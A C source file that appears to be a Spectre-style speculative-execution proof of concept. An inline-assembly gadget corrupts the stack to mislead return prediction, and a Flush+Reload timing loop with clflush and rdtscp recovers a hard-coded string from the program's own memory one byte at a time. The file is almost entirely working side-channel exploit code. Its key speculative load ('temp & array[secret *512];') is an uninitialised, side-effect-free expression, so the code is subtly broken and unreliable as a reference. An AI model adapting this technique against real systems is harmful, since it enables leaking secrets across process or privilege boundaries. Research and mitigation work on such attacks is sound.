#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

uint8_t array[256 * 512];
uint8_t hit[8];

char *secret_addr = "helloworldmagicboxisopen";

void flush()
{
	int i;
	for(i = 0; i < 256; i++)
		_mm_clflush(&array[i * 512]);
}

void gadget()
{
	asm volatile(
		"push %rbp    \n"
		"mov  %rsp, %rbp  \n"
		"pop %rdi   \n"
		"pop %rdi   \n"
		"pop %rdi   \n"
		"nop        \n"
		"mov %rbp, %rsp \n"
		"pop %rbp   \n"
		"clflush (%rsp)  \n"
		"leaveq     \n"
		"retq       \n"
		);
}

void speculative(char * secret_ptr)
{
	uint8_t temp,secret;
	flush();
	gadget();
	secret = *secret_ptr;
	temp & array[secret *512];
}


void read_secret(char * secret_ptr, uint8_t value[2], int score[2],int threshold) 
{

  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t * addr;



  for (i = 0; i < 256; i++)
    results[i] = 0;

  for (tries = 999; tries > 0; tries--) {
  	speculative(secret_ptr);
    for (i = 0; i < 256; i++) {
     	mix_i = ((i * 167) + 13) & 255;
     	addr = & array[mix_i * 512];
	time1 = __rdtscp( & junk); /* READ TIMER */
     	junk = * addr; /* MEMORY ACCESS TO TIME */
     	time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

     	if (time2 <= threshold)
        results[mix_i]++; /* cache hit - add +1 to score for this value */

    }



    /* Locate highest & second-highest results results tallies in j/k */

    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }

    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }

  results[0] ^= *addr; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];

}

int main()
{
	uint64_t time3,t0,time1 = 0;
	volatile uint8_t *addr;
	int i;
	unsigned int junk = 0;
	for(i = 0; i < 100; i++){
		hit[0] = 0x5A;
		addr = &hit[0];
		t0 = __rdtscp( & junk); /* READ TIMER */
     	junk = * addr; /* MEMORY ACCESS TO TIME */
     	time1 += __rdtscp( & junk) - t0; /* READ TIMER & COMPUTE ELAPSED TIME */
	}
	time3 = time1/100;
	printf("time threshold is %d\r\n",time3);

	int len = 24;
	uint8_t value[2];
	int score[2];
	while(--len >= 0){
		printf("Reading at secret_addr = %p... ", (void * ) secret_addr);
		read_secret(secret_addr++, value, score, time3);

    /* Display the results */
    	printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    	printf("0x%02X=’%c’ score=%d ", value[0],(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

    	if (score[1] > 0) {
     		printf("(second best: 0x%02X=’%c’ score=%d)", value[1],(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    }
    printf("\n");

  }

  return (0);

}
